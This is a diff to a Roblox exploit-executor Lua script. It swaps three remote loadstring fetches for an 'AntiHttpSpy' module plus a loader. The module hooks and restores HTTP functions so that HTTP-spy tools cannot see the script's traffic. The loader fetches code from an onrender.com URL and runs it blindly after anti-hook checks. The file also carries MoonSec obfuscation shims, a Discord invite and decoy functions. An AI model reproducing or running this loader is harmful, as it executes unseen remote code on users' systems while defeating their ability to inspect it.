@@ -1,10 +1,354 @@
+local AntiHttpSpy = {}
+AntiHttpSpy._meta = {}
+AntiHttpSpy._orig = {}
+AntiHttpSpy._protected = {}
 
+local HttpService = nil
+pcall(function() HttpService = game:GetService("HttpService") end)
 
-if not _G._30920929389UHIJSSIJSIXIKQJDBWOJ877188172 then
-    _G._30920929389UHIJSSIJSIXIKQJDBWOJ877188172 = true
-
-    
-        loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/41f9cc54277cae1b2a6a3250699365ea"))()
-        loadstring(game:HttpGet("https://pastefy.app/C5qIz6PY/raw"))()
-        loadstring(game:HttpGet("https://pastefy.app/Max9HJAc/raw"))()
+local function safe_tostring(x)
+    local ok, s = pcall(function() return tostring(x) end)
+    if ok then return s end
+    return "<tostring error>"
 end
+
+local function is_modified(orig, current)
+    if type(orig) ~= type(current) then return true end
+    if type(islclosure) == "function" then
+        local ok1, r1 = pcall(islclosure, orig)
+        local ok2, r2 = pcall(islclosure, current)
+        if ok1 and ok2 and r1 ~= r2 then
+            return true
+        end
+    end
+    local so = safe_tostring(orig)
+    local sc = safe_tostring(current)
+    if so ~= sc then
+        return true
+    end
+    return false
+end
+
+local function make_request_wrapper(key, orig_fn)
+    return function(req_table)
+        if is_modified(AntiHttpSpy._orig[key], orig_fn) then
+            warn("[AntiHttpSpy] Detected modification to "..tostring(key)..", restoring original.")
+            pcall(function() AntiHttpSpy._protected[key].restore() end)
+        end
+        if type(req_table) == "table" then
+            if not req_table.Headers then req_table.Headers = {} end
+            req_table.Headers["X-AntiHttpSpy"] = AntiHttpSpy._meta.marker
+        end
+        local ok, res = pcall(orig_fn, req_table)
+        if not ok then
+            warn("[AntiHttpSpy] request wrapper error: " .. tostring(res))
+            return nil
+        end
+        return res
+    end
+end
+
+local function make_HttpGet_wrapper(orig_fn)
+    return function(self, url, ...)
+        if is_modified(AntiHttpSpy._orig["game.HttpGet"], orig_fn) then
+            warn("[AntiHttpSpy] Detected modification to game.HttpGet, restoring original.")
+            pcall(function() AntiHttpSpy._protected["game.HttpGet"].restore() end)
+        end
+        local ok, res = pcall(orig_fn, self, url, ...)
+        if not ok then
+            warn("[AntiHttpSpy] game.HttpGet error: "..tostring(res))
+            return nil
+        end
+        return res
+    end
+end
+
+local function make_HS_method_wrapper(name, orig_fn)
+    return function(self, url, ...)
+        if is_modified(AntiHttpSpy._orig["HttpService."..name], orig_fn) then
+            warn("[AntiHttpSpy] Detected modification to HttpService."..name..", restoring original.")
+            pcall(function() AntiHttpSpy._protected["HttpService."..name].restore() end)
+        end
+        local ok, res = pcall(orig_fn, self, url, ...)
+        if not ok then
+            warn("[AntiHttpSpy] HttpService."..name.." error: "..tostring(res))
+            return nil
+        end
+        return res
+    end
+end
+
+AntiHttpSpy._meta.marker = ("AHS-%d"):format(math.random(100000,999999))
+
+local function protect_global(name, wrapper_fn)
+    local original = rawget(_G, name)
+    AntiHttpSpy._orig[name] = original
+    AntiHttpSpy._protected[name] = {
+        restore = function()
+            pcall(function() rawset(_G, name, AntiHttpSpy._orig[name]) end)
+        end
+    }
+    pcall(function() rawset(_G, name, wrapper_fn) end)
+end
+
+local function protect_table_field(tbl, fieldname, wrapper_fn, store_key)
+    local original = nil
+    pcall(function() original = rawget(tbl, fieldname) end)
+    AntiHttpSpy._orig[store_key] = original
+    AntiHttpSpy._protected[store_key] = {
+        restore = function() pcall(function() rawset(tbl, fieldname, AntiHttpSpy._orig[store_key]) end) end
+    }
+    pcall(function() rawset(tbl, fieldname, wrapper_fn) end)
+end
+
+local function setup_protections()
+    if rawget(_G, "http_request") then
+        local orig = rawget(_G, "http_request")
+        AntiHttpSpy._orig["http_request"] = orig
+        protect_global("http_request", make_request_wrapper("http_request", orig))
+    end
+    if rawget(_G, "request") then
+        local orig = rawget(_G, "request")
+        AntiHttpSpy._orig["request"] = orig
+        protect_global("request", make_request_wrapper("request", orig))
+    end
+    if type(syn) == "table" and type(syn.request) == "function" then
+        AntiHttpSpy._orig["syn.request"] = syn.request
+        AntiHttpSpy._protected["syn.request"] = {
+            restore = function() pcall(function() syn.request = AntiHttpSpy._orig["syn.request"] end) end
+        }
+        syn.request = make_request_wrapper("syn.request", syn.request)
+    end
+    if type(game.HttpGet) == "function" then
+        AntiHttpSpy._orig["game.HttpGet"] = game.HttpGet
+        protect_table_field(game, "HttpGet", make_HttpGet_wrapper(game.HttpGet), "game.HttpGet")
+    end
+    if HttpService then
+        if type(HttpService.GetAsync) == "function" then
+            AntiHttpSpy._orig["HttpService.GetAsync"] = HttpService.GetAsync
+            protect_table_field(HttpService, "GetAsync", make_HS_method_wrapper("GetAsync", HttpService.GetAsync), "HttpService.GetAsync")
+        end
+        if type(HttpService.PostAsync) == "function" then
+            AntiHttpSpy._orig["HttpService.PostAsync"] = HttpService.PostAsync
+            protect_table_field(HttpService, "PostAsync", make_HS_method_wrapper("PostAsync", HttpService.PostAsync), "HttpService.PostAsync")
+        end
+    end
+end
+
+local heartbeat_thread = nil
+local function start_heartbeat(interval)
+    interval = interval or 5
+    if heartbeat_thread then return end
+    heartbeat_thread = coroutine.create(function()
+        while true do
+            for k, info in pairs(AntiHttpSpy._protected) do
+                local orig = AntiHttpSpy._orig[k]
+                local current = nil
+                if k == "syn.request" then
+                    current = (type(syn) == "table" and syn.request) or nil
+                elseif k == "game.HttpGet" then
+                    current = game.HttpGet
+                elseif k:match("^HttpService") then
+                    local name = k:match("HttpService%.(.+)$")
+                    if HttpService then current = rawget(HttpService, name) end
+                else
+                    current = rawget(_G, k)
+                end
+
+                if current and is_modified(orig, current) then
+                    warn("[AntiHttpSpy] Heartbeat detected hook on: "..tostring(k)..", restoring.")
+                    pcall(info.restore)
+                end
+            end
+            wait(interval)
+        end
+    end)
+    pcall(function() coroutine.resume(heartbeat_thread) end)
+end
+
+function AntiHttpSpy.start(interval)
+    setup_protections()
+    start_heartbeat(interval)
+    warn("[AntiHttpSpy] started. marker="..tostring(AntiHttpSpy._meta.marker))
+end
+
+function AntiHttpSpy.stop()
+    for k, info in pairs(AntiHttpSpy._protected) do
+        pcall(info.restore)
+    end
+    AntiHttpSpy._protected = {}
+    AntiHttpSpy._orig = {}
+    heartbeat_thread = nil
+    warn("[AntiHttpSpy] stopped.")
+end
+
+pcall(function() AntiHttpSpy.start(5) end)
+
+local env_ok, Env = pcall(function() return getfenv() end)
+if not env_ok or type(Env) ~= "table" then
+    Env = _G
+end
+
+Env._ = "discord.gg/gQEH2uZUk"
+Env.Protected_by_MoonSecV2 = nil
+Env.Discord = nil
+
+local function http_get(url)
+    if type(syn) == "table" and type(syn.request) == "function" then
+        local ok, res = pcall(function() return syn.request({Url = url, Method = "GET"}) end)
+        if ok and type(res) == "table" and type(res.Body) == "string" and #res.Body > 0 then
+            return res.Body
+        end
+    end
+
+    if rawget(_G, "http_request") then
+        local ok, res = pcall(function() return http_request({Url = url, Method = "GET"}) end)
+        if ok and type(res) == "table" and type(res.body or res.Body) == "string" and # (res.body or res.Body) > 0 then
+            return res.body or res.Body
+        end
+    end
+    if rawget(_G, "request") then
+        local ok, res = pcall(function() return request({Url = url, Method = "GET"}) end)
+        if ok and type(res) == "table" and type(res.body or res.Body) == "string" and # (res.body or res.Body) > 0 then
+            return res.body or res.Body
+        end
+    end
+
+    local ok2, body = pcall(function() return game:HttpGet(url) end)
+    if ok2 and type(body) == "string" and #body > 0 then
+        return body
+    end
+
+    error("http_get: URL environment ")
+end
+
+local function islclosure_safe(f)
+    if type(islclosure) == "function" then
+        local ok, res = pcall(islclosure, f)
+        if ok then return res end
+    end
+    return false
+end
+
+Env._msec = function(p1_0, p2_0, p3_0)
+    local nums = {
+        195,116,42,224,150,76,2,184,113,44,218,144,70,254,182,104,30,212,219,133,35,217,35,24,206,132,
+        58,240,166,76,81,240,129,52,234,160,183,94,240,236,58,228,154,80,63,5,172,86,235,167,70,228,104,
+        41,173,97,118,68,250,176,102,183,210,136,62,244,170,96,134,12,66,62,238,164,90,113,23,186,86,0,
+        158,200,14,192,118,44,50,238,142,36,220,112,38,220,164,88,254,183,106,36,214,140,66,248,240,100,29,
+        208,137,60,243,168,100,93,202,131,54,241,162,89,14,197,122,52,9,156,82,8,195,116,43,224,154,111,2,
+        184,110,44,218,145,70,14,194,104,33,212,142,64,246,172,98,90,206,135,58,243,166,93,18,200,151,52,237,
+        160,88,12,194,120,64,34,154,83,6,190,114,40,222,166,97,0,186,108,39,216,142,68,12,176,102,33,210,
+        138,62,244,170,96,22,204,136,56,238,164,90,16,216,124,50,239,158,86,10,192,118,48,226,152,83,4,216,
+        112,39,220,146,93,254,189,106,36,214,140,66
+    }
+
+    for _, n in ipairs(nums) do
+        pcall(function()
+            if type(p3_0) == "table" and type(p1_0) == "table" then
+                local idx_a = p1_0[528]
+                local idx_b = p1_0[967]
+                if idx_a and idx_b and type(p3_0[idx_a]) == "table" then
+                    local candidate = p3_0[idx_a][idx_b]
+                    if type(candidate) == "function" then
+                        pcall(candidate, {}, tostring(n))
+                    end
+                end
+            end
+        end)
+    end
+
+    return true
+end
+
+Env.__secureeq = function(a, b, ...)
+    if (a ~= b) then
+        return false
+    end
+    return true
+end
+
+Env.TisER_PL = function(ext_1_0, ...)
+    if type(ext_1_0) ~= "string" then return nil end
+    local len = #ext_1_0
+    if len >= 1 then
+        return ext_1_0:sub(1, 1)
+    end
+    return ""
+end
+
+local url = "https://protected-roblox-scripts.onrender.com/c0a2f64dfed9828b01b6bc07400bd5b1"
+
+if not islclosure_safe(loadstring) then
+    if not islclosure_safe(table.concat) then
+        if not islclosure_safe(table.insert) then
+            if islclosure_safe(function() end) then
+                if not islclosure_safe(getfenv) then
+                    if not islclosure_safe(string.char) then
+                        if not islclosure_safe(string.byte) then
+                            local ok, err = pcall(function()
+                                local body = http_get(url)
+                                local f, load_err = loadstring(body)
+                                if not f then error(load_err) end
+                                f()
+                            end)
+                            if not ok then
+                                warn("Loader error: " .. tostring(err))
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+_G.__AntiHttpSpy = _G.__AntiHttpSpy or {}
+_G.__AntiHttpSpy.instance = AntiHttpSpy
+
+_G.__decoy_log = _G.__decoy_log or {}
+_G.__ENABLE_REAL_SEND = _G.__ENABLE_REAL_SEND or false
+
+local function make_decoy(name)
+    return function(...)
+        local args = {...}
+        table.insert(_G.__decoy_log, {name = name, time = tick(), args_count = #args})
+        return {Status = "Decoy", Name = name, Time = tick()}
+    end
+end
+
+for i = 1, 100 do
+    local n = ("http_fake_d"):format(i)
+    if rawget(_G, n) == nil then
+        rawset(_G, n, make_decoy(n))
+    end
+end
+
+local function send_real(url, opts, confirm_marker)
+    opts = opts or {}
+    if not _G.__ENABLE_REAL_SEND then
+        warn("[send_real] disabled: set _G.__ENABLE_REAL_SEND = true to enable")
+        return nil
+    end
+    if not confirm_marker or tostring(confirm_marker) ~= tostring(AntiHttpSpy._meta.marker) then
+        warn("[send_real] confirm_marker invalid or missing")
+        return nil
+    end
+
+    opts.Headers = opts.Headers or {}
+    opts.Headers["X-AntiHttpSpy"] = AntiHttpSpy._meta.marker
+
+    if type(syn) == "table" and type(syn.request) == "function" then
+        local ok, res = pcall(function() return syn.request({Url = url, Method = opts.Method or "GET", Headers = opts.Headers, Body = opts.Body}) end)
+        if ok then return res end
+        warn("[send_real] syn.request failed: "..tostring(res))
+        return nil
+    else
+        local ok, body = pcall(function() return game:HttpGet(url) end)
+        if ok then return body end
+        warn("[send_real] HttpGet failed: "..tostring(body))
+        return nil
+    end
+end
+
+_G.__send_real = send_real
